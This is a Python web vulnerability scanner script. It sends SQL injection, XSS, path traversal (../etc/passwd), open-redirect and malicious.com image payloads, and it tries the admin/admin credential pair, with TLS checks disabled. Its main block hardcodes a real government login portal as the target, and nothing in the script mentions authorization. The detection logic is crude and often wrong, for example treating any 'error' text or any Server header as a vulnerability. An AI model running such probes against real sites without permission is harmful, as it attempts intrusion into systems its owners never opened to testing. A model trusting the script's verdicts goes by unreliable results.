import requests
import urllib3
import threading
import queue

# Suppress warnings from urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class WebVulnScanner:
    def __init__(self, target_url):
        self.target_url = target_url
        self.queue = queue.Queue()
        self.results = []

    def check_sql_injection(self):
        payloads = ["' OR '1'='1", "' OR '1'='1' --", '" OR "1"="1', '" OR 1=1 --']
        vulnerable = False

        def execution():
            nonlocal vulnerable
            while not self.queue.empty():
                payload = self.queue.get()
                url = f"{self.target_url}?search={payload}"
                try:
                    response = requests.get(url, verify=False)
                    if "SQL syntax" in response.text or "error" in response.text.lower():
                        self.results.append(f"SQL Injection vulnerability detected with payload: {payload}")
                        print(f"SQL Injection vulnerability detected with payload: {payload}")
                        vulnerable = True
                except requests.RequestException as e:
                    print(f"Request failed: {e}")
                finally:
                    self.queue.task_done()
        
        # Populate the queue with payloads
        for payload in payloads:
            self.queue.put(payload)
        
        # Creating and starting execution threads
        threads = [threading.Thread(target=execution) for _ in range(4)]
        for thread in threads:
            thread.start()
        self.queue.join()
        
        if not vulnerable:
            print("No SQL Injection vulnerability detected")

    def check_xss(self):
        
        payloads = ["<script>alert('XSS')</script>", "<img src=x onerror=alert('XSS')>"]
        vulnerable = False
        
        def execution():
            nonlocal vulnerable
            while not self.queue.empty():
                payload = self.queue.get()
                url = f"{self.target_url}?search={payload}"
                try:
                    response = requests.get(url, verify=False)
                    if payload in response.text:
                        self.results.append(f"XSS vulnerability detected with payload: {payload}")
                        print(f"XSS vulnerability detected with payload: {payload}")
                        vulnerable = True
                except requests.RequestException as e:
                    print(f"Request failed: {e}")
                finally:
                    self.queue.task_done()
        
        # Populate the queue with payloads
        for payload in payloads:
            self.queue.put(payload)
        
        # Creating and starting execution threads
        threads = [threading.Thread(target=execution) for _ in range(4)]
        for thread in threads:
            thread.start()
        self.queue.join()
        
        if not vulnerable:
            print("No XSS vulnerability detected")
    
    # Checking CSRF token
    def check_csrf(self):
        csrf_payload = f"<img src='http://malicious.com/csrf?target={self.target_url}'>"
        url = self.target_url
        
        try:
            response = requests.get(url, params={'search': csrf_payload}, verify=False)
            if 'csrf' in response.text.lower():
                print('Possible CSRF vulnerability detected.')
            else:
                print('No CSRF vulnerability detected.')
        except requests.RequestException as e:
            print(f'Request Failed: {e}')
    
    # Checking directory traversal
    def check_directory_traversal(self):
        payloads = ["../etc/passwd", "../windows/win.ini"]
        vulnerable = False
        
        def execution():
            nonlocal vulnerable
            while not self.queue.empty():
                payload = self.queue.get()
                url = f"{self.target_url}?file={payload}"
                try:
                    response = requests.get(url, verify=False)
                    if "root:x:" in response.text or "windows" in response.text.lower():
                        self.results.append(f"Directory Traversal vulnerability detected with payload: {payload}")
                        print(f"Directory Traversal vulnerability detected with payload: {payload}")
                        vulnerable = True
                except requests.RequestException as e:
                    print(f"Request failed: {e}")
                finally:
                    self.queue.task_done()
        
        # Populate the queue with payloads
        for payload in payloads:
            self.queue.put(payload)
        
        # Creating and starting execution threads
        threads = [threading.Thread(target=execution) for _ in range(4)]
        for thread in threads:
            thread.start()
        self.queue.join()
        
        if not vulnerable:
            print("No Directory Traversal vulnerability detected")
    
    # Creating a function to check for an open redirect
    def check_open_redirect(self):
        payloads = ["http://malicious.com", "https://malicious.com"]
        vulnerable = False

        def execution():
            nonlocal vulnerable
            while not self.queue.empty():
                payload = self.queue.get()
                url = f"{self.target_url}?redirect={payload}"
                try:
                    response = requests.get(url, allow_redirects=False, verify=False)
                    if response.headers.get('Location') and payload in response.headers['Location']:
                        self.results.append(f"Open Redirect vulnerability detected with payload: {payload}")
                        print(f"Open Redirect vulnerability detected with payload: {payload}")
                        vulnerable = True
                except requests.RequestException as e:
                    print(f"Request failed: {e}")
                finally:
                    self.queue.task_done()
        
        # Populate the queue with payloads
        for payload in payloads:
            self.queue.put(payload)
        
        # Creating and starting execution threads
        threads = [threading.Thread(target=execution) for _ in range(4)]
        for thread in threads:
            thread.start()
        self.queue.join()
        
        if not vulnerable:
            print("No Open Redirect vulnerability detected")

    # Checking basic authentication bypass
    def check_basic_auth_bypass(self):
        try:
            response = requests.get(self.target_url, auth=('admin', 'admin'), verify=False)
            if response.status_code == 200:
                self.results.append("Basic Authentication Bypass vulnerability detected")
                print("Basic Authentication Bypass vulnerability detected")
            else:
                print("No Basic Authentication Bypass vulnerability detected")
        except requests.RequestException as e:
            print(f"Request failed: {e}")
    
    # Checking server info disclosure
    def check_server_info_disclosure(self):
        try:
            response = requests.get(self.target_url, verify=False)
            if 'Server' in response.headers:
                self.results.append("Server Info Disclosure vulnerability detected")
                print("Server Info Disclosure vulnerability detected")
            else:
                print("No Server Information Disclosure detected.")
        except requests.RequestException as e:
            print(f"Request failed: {e}")

if __name__ == "__main__":
    target_url = 'https://accounts.ecitizen.go.ke/en'
    
    scanner = WebVulnScanner(target_url)
    scanner.check_sql_injection()
    scanner.check_xss()
    scanner.check_csrf()
    scanner.check_directory_traversal()
    scanner.check_open_redirect()
    scanner.check_basic_auth_bypass()
    scanner.check_server_info_disclosure()
